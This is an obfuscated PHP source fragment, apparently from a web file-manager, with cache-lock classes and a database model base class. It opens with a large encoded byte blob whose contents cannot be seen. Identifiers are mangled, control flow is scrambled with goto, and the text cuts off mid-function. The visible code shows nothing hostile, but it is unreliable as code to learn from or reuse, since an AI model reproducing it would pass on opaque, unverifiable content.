%]J>')."\xa2\x20\x88\x11\x2a\x20\xad\x16\x3d\x43\x9c\x50\x59\xe1\x19\x8d\x4d\x8d\x82\x45\x87\xaf\xd3\x1b\x8e\x1d\x15\x86\xfe\x4e\xfd\x3e\xea\x63\xc7\x9a\xe0\x3\x69\x91\xd0\x24\x29\x9e\xd0\x64\x29\x81\x8e\xa3\x26\x49\xe9\xa4\xfb\x7\x6b"."\212\77\20\10\213\356\234\154\325\353\17\12\116\36\311\376\30\256\335\115\104\351\263\257\337\117\370\127\224\120\160\224\360\342\116\242\336\24\55\316\150\234\105\215\175\370\133\235\260\157\142\302\213\332\370\310\14".base64_decode('hzW0Q8NhKSFjo5i4gqUCJQkdvMLaSQaQlSknnwa9N7vdda6Z9dOn5URYtAECow3uaf2kGtM4DCBM').base64_decode('Z3D3qrqatbX1roa6aFM9U9+KUkuyaLRIlJ+G1sxax31JRgddDdGh6YI22RoAWMcA5Qw9D0MeLhiW')."\xd1\x50\x37\x58\x53\x3b\xe4\x6a\x18\x5c\x15\x8d\xe\xc1\x60\x3d\x80\xb5\x42\x78\x34\xec\x6a\xa8\x77\x2c\x9a\xee\xee\x57\xd\x11\x1f\x7b\xc4\x9e\x14\x87\x74\x39\xb5\x25\x2b\xb0\xc3\x7d\x28\xb2\xa8\x60\x97\x84\x2c\x29\x44\x7d\xda"."\240\27\60\145\301\105\236\231\53\10\144\13\375\44\315\231\45\52\246\143\10\135\122\212\164\355\103\101\152\274\125\340\12\372\126\145\132\26\265\314\226\106\251\3\210\152\26\253\151\213\37\77\241\166\372\114\241"."\240\230\350\12\23\101\304\167\117\140\134\170\32\126\250\53\220\327\4\347\57\260\40\352\61\211\10\2\262\221\231\304\133\20\166\334\1\32\40\324\11\261\26\27\334\360\13\13\155\217\315\365\26\331\106\125\366"."\41\16\3\102\46\123\13\341\201\117\241\175\15\365\147\302\165\302\313\161\322\3\260\217\143\266\17\62\223\354\254\260\35\345\72\60\110\232\340\132\130\64\112\105\244\204\134\200\367\65\111\174\62\16\72\236\174".strrev('K.A½#PÕûK}ıàYÌ|€/¼?ŠˆûÖ®vú"·´wØX¾}|€*†z1äáĞƒú…›')."\111\235\236\276\110\114\330\223\342\315\12\330\162\261\335\12\125\130\117\350\211\226\346\70\233\146\314\367\32\225\345\311\114\241\153\76\167\245\60\346\144\372\373\164\277\323\305\75\240\220\154\350\340\225\124\1\371"."\203\41\31\304\123\34\61\331\41\125\75\303\141\33\52\142\310\141\73\236\214\253\171\231\172\247\315\321\157\347\230\65\34\164\12\105\35\351\40\313\65\52\31\210\167\327\5\166\1\110\314\305\164\220\252\43\43"."\156\341\314\56\157\206\224\264\30\365\153\114\147\17\255\346\125\212\200\157\13\11\206\46\160\223\342\111\230\105\361\15\43\341\55\170\20\133\302\335\254\12\146\172\316\46\211\265\50\206\113\306\221\231\102\2\326"."\x14\xaf\x62\xea\x67\xf3\x94\x80\x6c\x67\xf1\xe4\x45\x56\xe3\xe1\x62\x9c\xf9\xbb\xb1\xd9\xe6\x51\x17\xb0\x92\x68\x15\x47\x9d\xbc\xc2\x2\xd0\xb3\x3b\xb0\x5\x86\x98\x6\x8a\x85\x4f\x41\xf3\x96\x89\x59\xd0\x37\x2b\xb2\xe0\x34\x68"."\xbc\xc6\x59\x99\x98\x62\x40\x85\xac\x7e\x2a\x76\x55\x4b\xa9\xf2\x29\x94\x24\xf4\x68\x82\xee\xe3\xa8\xf\x3b\xd2\x49\xbc\xaf\x4c\xda\xdf\xcd\xce\x16\xe2\xc\x45\xf4\x12\x4b\x4c\xdf\x48\xe7\x3a\x9b\x25\x81\xbc\x20\xef\x11\x28\x2".base64_decode('n0awbuTGnFmOo0EPDwoffG4siN8EYkOLHg9iMV0wJFOSdOjQ4ztV1xIMRK/z9FdLx50Fk7ss7jxt')."\10\140\312\133\323\321\27\305\312\244\360\113\114\26\267\206\266\102\164\234\326\245\160\347\43\50\27\157\7\367\214\12\100\140\357\203\136\170\344\35\303\175\326\341\327\206\250\377\126\117\62\151\7\107\64\6\254"."\364\173\347\142\236\147\211\33\175\260\51\15\373\2\175\165\365\120\312\262\370\14\350\35\147\216\316\301\110\242\165\274\127\36\343\3\305\42\64\225\321\251\141\211\140\127\222\226\334\14\304\260\312\112\234\261\155"."\302\110\173\202\156\6\352\240\335\304\336\265\41\206\322\360\125\1\261\320\0\221\131\313\330\2\212\360\322\126\346\135\223\156\211\312\71\65\41\371\3\113\340\176\274\313\27\136\52\245\25\123\342\202\20\272\270"."\260\316\174\344\360\1\35\364\121\302\217\123\265\26\24\164\242\103\21\247\305\265\20\333\245\210\156\67\141\101\25\5\343\121\27\213\203\47\52\316\44\63\234\265\341\122\301\241\42\207\370\175\41\17\334\345\130"."\171\5\2\223\375\217\265\234\161\5\336\15\124\377\166\261\312\167\11\176\226\237\247\10\31\324\174\111\65\124\316\6\150\127\215\213\370\25\175\211\232\42\40\100\107\143\334\232\234\165\53\373\116\205\225\63\217"."\143\34\362\152\231\140\117\213\207\104\174\311\117\130\41\240\57\3\260\374\162\375\267\2\165\100\103\256\334\51\155\220\250\160\173\155\171\362\217\44\203\335\241\254\122\122\307\141\41\107\310\267\244\47\62\131\161"."\x15\xd8\x6a\x92\xbf\xe7\x67\xab\x8c\x9a\xa4\x12\x24\xf3\xf9\xd\xe4\x46\x54\x1e\xd6\xe4\xb1\xd4\x9\x2a\x2b\x70\xde\xe1\xeb\x72\xa0\xc7\xd6\xb8\x13\x59\x14\x4\x32\xa6\x3\x1e\x79\xa1\xa\x38\xf8\xb5\x7d\xc\x5d\x1c\x93\x69\xa5"."\152\310\250\225\330\162\142\230\57\20\103\202\52\211\272\355\142\163\12\31\210\42\213\43\301\275\221\233\36\103\62\37\340\360\64\332\113\235\355\270\114\32\202\140\156\215\12\63\322\207\306\150\145\161\324\356\23"._kodDe('KVgskIZmII82wrkO4sl3KhukF9ECnnSFqQmzEPVChMaVYFhR06m2PI2d7HT7+OYDfoBx2vkiJlMs9g==').base64_decode('sNjf+2k1mBtVaFqST2liyxDL8gLW4EAhbHbtgKfXZhARgV8pKdbsk5Zl2Hk9F0HAnIaGIlxXmUIE').strrev(';t?xØuu#_×'."\n".'½‰£'."\n".'T¡\'Q\'`/iFRü”S¹‰…}aL7Ğ¿§Õ¸*¸d6 DQ=ÂÃ')."\47\347\31\303\201\303\10\220\260\133\42\20\340\23\201\246\11\124\203\65\333\103\330\255\243\13\373\320\240\42\114\132\145\276\133\55\150\144\226\200\335\306\244\336\136\310\262\210\75\277\24\363\76\374\334\200\5"."\252\13\222\272\350\7\30\373\270\341\236\334\11\72\370\132\20\73\265\41\363\130\54\222\72\26\102\77\120\226\7\144\316\54\242\335\225\216\210\240\333\111\46\165\160\67\255\304\53\224\113\24\245\11\202\264\120"."\242\323\314\60\55\344\7\45\25\40\304\70\120\0\321\264\50\157\125\207\132\150\32\241\260\1\103\157\111\262\261\203\75\112\176\272\224\24\223\104\141\234\157\131\304\7\125\150\23\60\251\124\174\3\375\302\375"."\270\3\267\321\301\310\105\65\374\110\123\321\10\143\271\314\301\235\361\73\360\61\77\262\207\341\74\205\167\7\235\10\151\205\177\20\326\60\42\176\334\42\0\332\145\77\326\113\266\14\41\173\117\106\264\112\27"."\xd\xdc\xf3\x52\xbe\x98\xe3\x2e\xae\x40\xc4\x2a\xb\xe3\x5d\x2\x75\x6e\xf1\x3\xcd\x2d\xea\x59\x7\xd2\xb2\x75\xd0\x67\x6\x1d\xf8\x31\x5a\x87\xa5\x8\x54\xa1\x98\x29\x34\x98\x9\x61\xb6\xe1\xaa\xf8\xd8\x7f\x50\x3a\x71\xea\x8b"."\xe4\x60\x20\x51\x60\x9f\x17\x38\xa9\x15\xdd\x91\x54\x47\x53\x2d\x74\x9\x36\xa2\xfc\xf4\x19\xbf\x56\x5a\xb0\xf3\xd7\x95\xb9\x64\x73\xcb\xec\xf9\xe2\xd6\x93\xf\x23\x77\xa5\x43\x6e\x5\xe8\xf3\xda\x64\xae\x32\xc2\x90\xac\x74\x26".strrev('k ²y7lŒêÌy]n…TãëÿşWÚ ºJÆp“8©Iªx:hÿ¯ñ´_¶£É‰¾­™ÅR\'Ñ').base64_decode('ilIxGA0Pm19mJpDPjtubjJ/8/M8rTYVD2eqKC6XydRayD/plekKctq2aeKkWxlY4J1HMALTMJyMv')."\154\105\100\212\5\115\130\71\101\214\11\15\374\235\60\130\61\132\223\111\366\16\164\356\362\352\240\27\11\270\3\20\104\246\26\222\25\136\337\25\35\374\243\202\42\202\143\304\312\242\321\346\225\124\222\320\54"."\xba\xf9\x47\x5e\xf2\x3c\x4b\xd8\x9b\xd\xf0\x56\x94\x57\x1\xc6\x38\xa3\x32\x35\x9e\x62\x6a\xd6\x67\x63\x2\xf4\x8\x10\xec\x7e\x2d\xb2\x30\x88\x73\x13\x2a\x61\xe6\x25\x6d\x40\x51\x2e\x11\x66\x32\x98\x61\xaa\x20\xcf\x12\x41\x8f"."\x4b\x4e\xa8\xa1\x82\x73\x23\xb2\xbf\xe6\x3d\xe5\x21\x64\x9d\x74\x88\x6f\xe\x83\x28\xa3\x3a\xb2\xa6\x90\xb9\x8f\x3c\x27\xe3\xcf\xa\x2b\x8\x5f\x2c\x78\xa8\x8f\x5a\x19\xc0\x88\x70\xba\x84\xe4\x4f\x96\x98\x11\x45\x53\xf8\xb4\x15"."\16\121\101\213\325\2\361\271\152\23\0\127\2\122\37\131\306\120\220\362\126\250\206\214\254\177\141\36\322\173\126\136\201\32\364\3\153\41\54\216\171\356\26\26\126\221\167\357\51\246\22\62\162\130\142\44\302"."\145\74\244\301\55\334\106\241\70\363\311\112\37\45\243\157\225\311\314\265\14\364\311\303\166\137\370\264\212\240\144\263\174\235\20\37\222\311\306\145\335\5\310\151\304\244\76\314\252\105\304\367\22\252\154\32\250"."\x4\xc2\x1b\x90\x57\x13\x23\x55\x7c\x16\xc1\xce\x86\xda\x3d\x2\x8b\x16\x16\xb6\xa\x34\xce\x35\xc0\xfa\xc7\xb4\xf2\x68\x8\x9\xcf\x50\x24\x22\x6f\xaa\x5b\x5e\xef\x8\xb0\xdb\xea\x7a\xe2\xef\x6e\x68\x31\x9d\xfd\x70\xca\xd1\x23".base64_decode('L3HiW0AV7CJiWSssQLF7CBFAz/iUHiw5oI+jDkHmxkiG2LeWk7pKF1aVudkEFLPw5QLHY6Ci1j2w')."\130\64\276\141\206\373\274\20\334\222\271\154\305\263\31\123\165\226\250\6\76\71\24\367\35\40\44\126\224\116\263\240\256\241\325\337\12\145\153\200\140\351\44\150\41\205\355\214\312\166\232\11\204\165\341\244\37"."\xbf\xea\x89\x9f\x5b\x87\x4f\x12\x2\x76\x25\x85\xfb\x7b\xeb\x90\x8b\x73\x8\x80\x1\xfc\x32\xdc\x6a\x22\x8c\xac\x96\xf6\x92\x84\xff\xf0\xfb\x80\x75\x30\x19\x16\xb2\x5a\xf2\xf5\xf1\x17\x9a\xeb\x25\xfe\xae\x9d\xf8\xa6\x3b\x3c\xf6"."\352\326\30\35\300\233\113\101\311\305\372\140\3\364\261\154\235\3\355\325\320\22\232\156\10\150\302\223\44\313\240\353\171\34\354\125\363\364\235\20\102\332\64\73\31\11\34\253\126\76\30\370\260\151\31\42\376"."\xc4\xbd\xfd\x69\x7b\xb4\xdb\xc3\x1b\x38\xcb\x3e\x8e\x28\xff\x88\x20\xe1\xa0\xa\x6a\xb8\x5b\x3d\xcb\xa2\x44\x4\xa6\x2f\x81\x92\x12\x84\x13\x78\xeb\x5d\x8\x7b\xca\xbc\x82\x6f\x15\x55\xbf\x90\x8c\x72\xd1\x7\xe7\xc0\x2f\x7c\xcb"."\xc1\xc7\x5d\x40\xa0\x64\x7c\x3e\xe8\x29\xc9\x4c\x31\xc6\x9e\xab\xdf\x22\xc\xb\x37\x27\x9\x44\x90\x7c\xc7\x82\x32\xc6\x41\x2d\xd1\x3f\x9e\x82\x6a\xcf\x61\x66\x54\x3d\xd9\xa1\xe6\x93\x76\xfc\x62\x3e\xce\xa0\x1c\x1d\xc\x46\x47"."\65\60\20\244\70\353\266\301\205\125\206\63\117\271\304\117\321\271\10\232\114\166\313\245\52\250\314\140\233\101\1\204\241\42\311\107\170\162\206\273\44\126\312\342\327\11\136\252\162\215\201\210\225\120\376\44\215"."\275\135\150\32\61\70\271\314\310\13\216\335\10\271\161\20\302\111\60\237\177\270\50\350\340\331\5\175\146\163\147\200\270\216\154\47\311\77\151\175\71\207\241\61\251\14\340\40\325\167\247\5\152\363\212\14\317"."\342\350\152\153\113\42\333\130\241\370\252\273\135\13\51\370\205\342\304\273\223\111\63\204\253\177\204\323\253\265\213\205\127\206\170\2\135\324\64\113\347\13\274\225\65\214\140\206\304\104\113\165\354\103\213\166\17"."\234\56\61\60\207\16\272\160\232\307\232\204\361\25\133\355\305\14\366\226\341\34\172\105\377\220\74\325\77\155\377\0\355\36\373\315\45\57\104\330\274\124\134\253\106\264\52\171\160\215\252\146\303\111\60\47\227"."\332\54\171\215\262\152\46\62\125\363\342\44\230\267\42\231\146\26\366\341\102\76\123\56\32\223\64\257\262\363\320\64\262\165\35\151\60\167\135\56\240\116\326\237\125\221\53\77\107\210\307\216\215\366\317\325\153".base64_decode('UfUcYLJaVEWetBYc23ZbWo0f0pQqHJBfblbyWp5W5aoVlwkX4pBFG7EiWby3rX6zG6o6iw3rlasN').base64_decode('LnYMdyVJnEuO5Kk3JpCdezmEFpce3d45VLaz+Q2mtJcvCr5qqzoedsANb+WOMkt9dYlumfFORDPV')."\204\240\342\1\201\242\147\141\234\116\77\222\345\107\143\104\22\300\267\164\135\242\306\362\273\167\237\274\343\376\353\167\334\172\345\216\263\117\331\166\316\305\216\355\353\257\335\276\351\364\355\233\66\154\73\343\312".base64_decode('bZfcgBO2X3bie5ecvUDafvpxMPHCU9954G7877Zr7nv31s07HrwVo2y77b53b7t2x/k3bD/tnu0X')."\375\162\373\5\247\115\25\72\5\324\133\347\16\12\55\267\213\125\322\135\374\104\326\342\36\33\275\342\306\214\335\261\4\100\316\244\361\305\13\122\372\41\220\216\161\270\137\163\340\205\25\47\207\65\335\204\106".strrev('ò¨H³³K2±8+'."\r".'·¸ +’'."\n".'˜ÄG:!×ƒ\'\\#±ò"rDÂ5RŸ)4Íß (A`ğ')."\74\275\273\150\273\163\342\0\260\53\215\153\143\204\326\320\3\74\274\76\360\74\234\164\213\135\26\344\357\57\20\142\27\57\307\221\226\232\341\306\51\156\242\321\356\104\145\70\311\123\221\114\243\215\144\117\242".strrev('üøõíæ–Mô	ì‘P‰ —(É±ZÂê xp‚’+„Â»ÌH}LÇG2ßˆä	Pşt¼ÉÉ')."\x15\x69\x50\x33\x1\xea\xea\xd2\xd7\x4c\x71\x92\x2f\x88\x6a\xe9\xf1\xfb\xa9\x6a\x5c\x65\x2d\x7c\x9d\x4b\x79\x4d\xd0\x5d\x1b\x3f\x7\x2e\x64\x34\x7a\xac\x6a\x53\xdb\xa1\xc7\xe6\x61\x99\xce\x46\xf1\x1\xf\x25\xc7\x8e\xb9\x84\x22"."\xac\x47\x10\xe2\x30\x1b\xf4\x85\x5d\x16\x28\x54\x6c\x51\x4\xe9\x2\x6a\xf\xf4\x91\xc2\x42\xd4\x1\x25\x7c\xa\x9e\x71\x16\x26\x2e\xa3\x6\xd9\x55\x93\x54\x61\x1e\xe0\x9b\x45\x97\xe5\x6\x52\x80\xa3\x89\x83\x78\x9d\x40\x90\xe2"."\x3a\x8e\x0\x44\xad\xd6\x76\xdf\x63\xeb\xcc\xca\xfb\x4e\xfb\x1d\x22\xef\x1c\xd8\x86\xa3\xa8\x33\x8a\x61\x2d\x2e\x5c\x22\x61\x76\x68\x61\x84\xa2\x2e\x8\xe\x5b\x92\x1\x9f\x89\x68\x11\x39\x4d\xf8\xa\x94\x6c\x78\xac\x63\x5c\xc"."\x8b\xe7\x26\xed\x8c\xad\x98\x72\x9a\xde\xf6\xdb\x39\xbe\x70\xbd\xd\x7b\xe9\xff\x1\x7c\xf8\xa6\xb8\xc4\xc5\x0\x0"._kodDe('KQ=='), 10, -8))); goto FóïŠõíˆ; d²¦–Å¸¡: class CacheLockRedis { public function lock($fğìéñ˜İ‘, $B°é–áì = 10) { $D®ÜŒÎ¼ = Cache::init(); $aò‚í™¿•¼ = microtime(!0) + $B°é–áì; while (microtime(!0) < $aò‚í™¿•¼) { $F¨Ì¬Š¥æ = $D®ÜŒÎ¼->get($fğìéñ˜İ‘); if (!$F¨Ì¬Š¥æ) { $bªŒ‹Ê½µñ = $D®ÜŒÎ¼->setLock($fğìéñ˜İ‘, $aò‚í™¿•¼, $B°é–áì); if ($bªŒ‹Ê½µñ) { return !0; } } else { if ($F¨Ì¬Š¥æ < microtime(!0)) { $D®ÜŒÎ¼->set($fğìéñ˜İ‘, $aò‚í™¿•¼, $aò‚í™¿•¼); if ($D®ÜŒÎ¼->get($fğìéñ˜İ‘) === $F¨Ì¬Š¥æ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Eø†¿“Á‹) { return Cache::init()->get($Eø†¿“Á‹); } public function unlock($cŸº„°) { return Cache::init()->remove($cŸº„°); } } class CacheLockMemcached { public function lock($e†àÉİº–, $E†ˆô™Ïßƒ = 0) { $F¿º¡‹áµ¶ = Cache::init(); $aì‘Á °“½ = microtime(!0) + $E†ˆô™Ïßƒ; while (microtime(!0) < $aì‘Á °“½) { $EÂ®‚Šª«Ô = $F¿º¡‹áµ¶->get($e†àÉİº–); if (!$EÂ®‚Šª«Ô || $EÂ®‚Šª«Ô < microtime(!0)) { $f¿ø‡„µ„ = $F¿º¡‹áµ¶->handle->add($e†àÉİº–, $aì‘Á °“½, $E†ˆô™Ïßƒ); if ($f¿ø‡„µ„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dÊŠ˜×ƒˆå) { return Cache::init()->get($dÊŠ˜×ƒˆå); } public function unlock($d¯©—¡¿ãà) { return Cache::init()->remove($d¯©—¡¿ãà); } } class CacheLockDatabase { public function lock($Dˆ©ƒäŸÈ, $eö¦Ú‹ÃÆ÷ = 0) { $fˆ—Íƒ¹“³ = Model($_SERVER[í…¶][759]); $EªÕÂ‘Ïø¸ = microtime(!0) + $eö¦Ú‹ÃÆ÷; while (microtime(!0) < $EªÕÂ‘Ïø¸) { $Dœ‰¶á÷Ä’ = $fˆ—Íƒ¹“³->get($Dˆ©ƒäŸÈ); if (!$Dœ‰¶á÷Ä’ || $Dœ‰¶á÷Ä’ < microtime(!0)) { $CîŒ¿â¼¤ = $fˆ—Íƒ¹“³->set($Dˆ©ƒäŸÈ, $EªÕÂ‘Ïø¸); if ($CîŒ¿â¼¤) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B‹Òğ¹£¿) { return Model($_SERVER[í…¶][759])->get($B‹Òğ¹£¿); } public function unlock($B©êÏ›¬²‰) { Model($_SERVER[í…¶][759])->remove($B©êÏ›¬²‰); } } goto Eù„…£ÓÙ; E½µ‡Ã·ğ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\146\x79\x54\151\x6d\x65", "\164\151\155\145", "\x69\x6e\163\x65\162\164\x2c\x75\x70\144\x61\x74\145", "\x66\x75\156\143\164\x69\x6f\x6e"), array("\143\162\145\141\164\145\x54\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\162\164", "\x66\165\156\x63\164\151\x6f\156")); public function setDataAuto($D‡’œ²ŞŒ¸) { $this->dataAuto = $D‡’œ²ŞŒ¸; } public function __construct($cŠ ›¡„ñ = '', $DÃ´¤¦íÂé = '', $DÑĞãõ¬¼ä = '') { parent::__construct($cŠ ›¡„ñ, $DÃ´¤¦íÂé, $DÑĞãõ¬¼ä); } public static function textEncode($CÜïæ° ßÑ) { if (!$CÜïæ° ßÑ) { return $CÜïæ° ßÑ; } $Cíì£¬ò¾ = json_encode($CÜïæ° ßÑ); $Cíì£¬ò¾ = preg_replace_callback($_SERVER[í…¶][351], function ($C›ÍáóÂ”æ) { return addslashes($C›ÍáóÂ”æ[0]); }, $Cíì£¬ò¾); return json_decode($Cíì£¬ò¾); } public static function textDecode($bºæäœâ©) { $Cì²‚´á =& $_SERVER[í…¶]; $C¥èíº²•ò = json_encode($bºæäœâ©); $C¥èíº²•ò = preg_replace_callback($Cì²‚´á[352], function ($D¶÷â„Âº‹) { return $_SERVER[í…¶][93]; }, $C¥èíº²•ò); return json_decode($C¥èíº²•ò); } protected $tableMeta = array(); protected function _beforeInsert(&$E‚ñƒÑ¤£©, $Bí†ö›¶óÎ) { $aï°¾ÄÌ§ =& $_SERVER[í…¶]; if (!$this->checkDataAutoHas($aï°¾ÄÌ§[353])) { return; } $this->dataBeforeFilter($E‚ñƒÑ¤£©, $aï°¾ÄÌ§[353]); } protected function _beforeUpdate(&$A”ïÀšÇŠ¦, $aÜïİ»ƒ†¦) { $eæÜÊ£Üğ =& $_SERVER[í…¶]; if (!$this->checkDataAutoHas($eæÜÊ£Üğ[354])) { return; } $this->dataBeforeFilter($A”ïÀšÇŠ¦, $eæÜÊ£Üğ[354]); } protected function _afterSelect(&$AÊŞ”¨§„¯, $fòõŸÌò§ö) { if (!is_array($AÊŞ”¨§„¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[í…¶][355])) { return; } foreach ($AÊŞ”¨§„¯ as &$aê¡ùŞ•ä¯) { $this->dataAfterFilter($aê¡ùŞ•ä¯); } } protected function _afterFind(&$e¹…ñ·ˆî‰, $DæÓŠŠ“îš) { if (!is_array($e¹…ñ·ˆî‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[í…¶][355])) { return; } $this->dataAfterFilter($e¹…ñ·ˆî‰); } public function setAutoIncrement($bßÚáÄå) { $cÅÈŞï©‹ = array($this->getPk() => $bßÚáÄå); $DÀŒ¹ù¾Ú» = $this->data($cÅÈŞï©‹)->add(); if ($DÀŒ¹ù¾Ú») { $this->delete($DÀŒ¹ù¾Ú»); } } public function getAutoIncrement() { $f§¬­¿Ìäš = $this->getTableName(); $eåë™–©ª = $this->max($this->getPk()); $fã‚ÕÒ†× = $this->query("\163\150\157\x77\x20\164\141\142\x6c\145\x20\x73\x74\141\164\165\x73\40\x77\x68\145\x72\x65\x20\116\x61\155\145\75\47{$f§¬­¿Ìäš}\47"); $DÚ‘öØĞ = $fã‚ÕÒ†×[0][$_SERVER[í…¶][356]]; $aØèÅÏ± = max($eåë™–©ª, $DÚ‘öØĞ); return $aØèÅÏ±; } protected function _callBefore($c—¶½ªä´, $EœõÏ¸ùÇ¾) { return $this->cacheCallCheck($c—¶½ªä´, $EœõÏ¸ùÇ¾, !1); } protected function _callAfter($BØêÃ´Œ½º, $Aº˜áÒ¿…) { return $this->cacheCallCheck($BØêÃ´Œ½º, $Aº˜áÒ¿…, !0); } protected function cacheFunctionAlias($c–¯Î•Ä¹£) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d¸Ë‘‘Ï§ö, $f±åµÙÍ¾, $A­šøñ = false) { $C‚ŞŒ¦’õ— = $this->cacheFunctionAlias($f±åµÙÍ¾); if (!$C‚ŞŒ¦’õ—) { return; } foreach ($C‚ŞŒ¦’õ— as $AíÚšèŸ°• => $eâ˜øñÂŞ¾) { $aˆšíëšöã = $eâ˜øñÂŞ¾[0]; $D•§´§ï é = explode($_SERVER[í…¶][47], $eâ˜øñÂŞ¾[1]); if ($d¸Ë‘‘Ï§ö == $AíÚšèŸ°•) { return $this->cacheFunctionGet($AíÚšèŸ°•, $aˆšíëšöã); } if ($A­šøñ && in_array($d¸Ë‘‘Ï§ö, $D•§´§ï é)) { $this->cacheFunctionClear($AíÚšèŸ°•, $aˆšíëšöã); } } } public function cacheFunctionGet($C„ØÒì¡–, $CîÙêóø–ß) { $B„ÄöÅæŸ = $this->cacheKeyMake($C„ØÒì¡–, $CîÙêóø–ß); $F®Õ§Èƒèø = Cache::get($B„ÄöÅæŸ); if (!is_array($F®Õ§Èƒèø)) { $F®Õ§Èƒèø = call_user_func_array(array($this, $C„ØÒì¡–), array($CîÙêóø–ß, !0)); Cache::set($B„ÄöÅæŸ, $F®Õ§Èƒèø); } return $F®Õ§Èƒèø; } public function cacheFunctionClear($F†ŠÈ†îÒ, $c”ßÖè¨Üƒ) { $fÆ¨“î”ì® = $c”ßÖè¨Üƒ; if (!is_array($c”ßÖè¨Üƒ)) { $fÆ¨“î”ì® = array($c”ßÖè¨Üƒ); } foreach ($fÆ¨“î”ì® as $BéÄ«½–ã–) { $båÙïŞÕó¨ = $this->cacheKeyMake($F†ŠÈ†îÒ, $BéÄ«½–ã–); Cache::remove($båÙïŞÕó¨); } } private function cacheKeyMake($D²Ó˜¾Üêè, $C»Ñ£ë——ï) { $d›¤ŞÄ‹î =& $_SERVER[í…¶]; return get_class($this) . $d›¤ŞÄ‹î[70] . $D²Ó˜¾Üêè . $d›¤ŞÄ‹î[357] . $C»Ñ£ë——ï; } protected function selectPage($fÛ›‰Ê™Ú = 200, $cŸï‹¿õì = 1) { goto aõé×Â×á¹; DÍà‡î«Îİ: $a¿«°“ôáõ = 4000; $fÛ›‰Ê™Ú = isset($in[$c…Ê­Ó…Ğå[358]]) ? $in[$c…Ê­Ó…Ğå[358]] : $fÛ›‰Ê™Ú; if ($fÛ›‰Ê™Ú === -1) { unset($in[$c…Ê­Ó…Ğå[358]]); $a¿«°“ôáõ = 100000000; $fÛ›‰Ê™Ú = $a¿«°“ôáõ; } goto CáõÙí°–»; aêˆŠëœØ—: $this->optionsValue($E¥åİÆ„¾ó); $eËÌ¾•œ÷ˆ = $this->page($cŸï‹¿õì, $fÛ›‰Ê™Ú)->select(); $eËÌ¾•œ÷ˆ = is_array($eËÌ¾•œ÷ˆ) ? $eËÌ¾•œ÷ˆ : array(); goto D»ÂºèÃÀ; CáõÙí°–»: $C†ˆÉŒæŞØ = $E¥åİÆ„¾ó; $C†ˆÉŒæŞØ[$c…Ê­Ó…Ğå[359]] = array(); $this->optionsValue($C†ˆÉŒæŞØ); goto Fñù¦É¶¹Î; cœØ»Õ‰ˆ: $C‰ã±”öóì = ceil($Eİ°‡ìŒ›‡ / $fÛ›‰Ê™Ú); $cŸï‹¿õì = intval(isset($in[$c…Ê­Ó…Ğå[340]]) ? $in[$c…Ê­Ó…Ğå[340]] : $cŸï‹¿õì); $cŸï‹¿õì = $cŸï‹¿õì <= 1 ? 1 : ($cŸï‹¿õì >= $C‰ã±”öóì ? $C‰ã±”öóì : $cŸï‹¿õì); goto aêˆŠëœØ—; D»ÂºèÃÀ: if ($C‰ã±”öóì == 1) { $Eİ°‡ìŒ›‡ = count($eËÌ¾•œ÷ˆ); } $e÷Á°Â¨õß = array($c…Ê­Ó…Ğå[360] => array($c…Ê­Ó…Ğå[361] => $Eİ°‡ìŒ›‡, $c…Ê­Ó…Ğå[358] => $fÛ›‰Ê™Ú, $c…Ê­Ó…Ğå[340] => $cŸï‹¿õì, $c…Ê­Ó…Ğå[362] => $C‰ã±”öóì), $c…Ê­Ó…Ğå[363] => $eËÌ¾•œ÷ˆ ? $eËÌ¾•œ÷ˆ : array()); return $e÷Á°Â¨õß; goto B³ğñ„Ö„È; Fñù¦É¶¹Î: $Eİ°‡ìŒ›‡ = intval($this->count()); $fÛ›‰Ê™Ú = intval($fÛ›‰Ê™Ú); $fÛ›‰Ê™Ú = $fÛ›‰Ê™Ú <= 5 ? 5 : ($fÛ›‰Ê™Ú >= $a¿«°“ôáõ ? $a¿«°“ôáõ : $fÛ›‰Ê™Ú); goto cœØ»Õ‰ˆ; aõé×Â×á¹: $c…Ê­Ó…Ğå =& $_SERVER[í…¶]; global $in; $E¥åİÆ„¾ó = $this->optionsValue(); goto DÍà‡î«Îİ; B³ğñ„Ö„È: } protected function checkLength($dÊÉ—•‹ƒ, $FÃ¡¼ŸõŠÖ = 0, $D®µÊˆ©µ = '') { $D¨ù˜·áºÚ =& $_SERVER[í…¶]; $FÃ¡¼ŸõŠÖ = $FÃ¡¼ŸõŠÖ ? $FÃ¡¼ŸõŠÖ : 65536; if (!$dÊÉ—•‹ƒ || strlen($dÊÉ—•‹ƒ) < $FÃ¡¼ŸõŠÖ) { return; } $D®µÊˆ©µ = $D®µÊˆ©µ ? $D®µÊˆ©µ . $D¨ù˜·áºÚ[67] : $D¨ù˜·áºÚ[33]; show_json($D®µÊˆ©µ . LNG($D¨ù˜·áºÚ[364]) . "\x28{$FÃ¡¼ŸõŠÖ}\51", !1); } protected function metaSet($CŞª•›”£Î, $a…ÂÑê = null, $Aˆ”ô­»ëÛ = null) { goto Eâ­ãí’¿; Eâ­ãí’¿: $BĞ¼•®Ğ =& $_SERVER[í…¶]; if (!$this->tableMeta) { return !1; } $e…²—®Ü” = $this->tableMeta[$BĞ¼•®Ğ[365]]; goto DŞÏÆÂåß™; döƒ°êÀà: $eÈ‰Ï‡ß³->where(array($e…²—®Ü” => $CŞª•›”£Î))->addAll($FÇ¹¹ÎÛù, array(), !0); return !0; goto A»Ö¸±Ù‘•; f¢„ŸÛ®Ä: if (is_null($a…ÂÑê)) { return $eÈ‰Ï‡ß³->where(array($e…²—®Ü” => $CŞª•›”£Î))->delete(); } if (is_null($Aˆ”ô­»ëÛ) && is_string($a…ÂÑê)) { return $eÈ‰Ï‡ß³->where($eš¹ã·×—)->delete(); } $a³“–†ãÖÈ = is_array($a…ÂÑê) ? $a…ÂÑê : array(); goto E¾ ×õÕç‡; E¾ ×õÕç‡: if (is_string($a…ÂÑê)) { $a³“–†ãÖÈ[$a…ÂÑê] = $Aˆ”ô­»ëÛ; } $FÇ¹¹ÎÛù = array(); foreach ($a³“–†ãÖÈ as $AÊ‘ù¯™Î => $dË¤‡ƒù–) { $this->checkLength($dË¤‡ƒù–, !1, 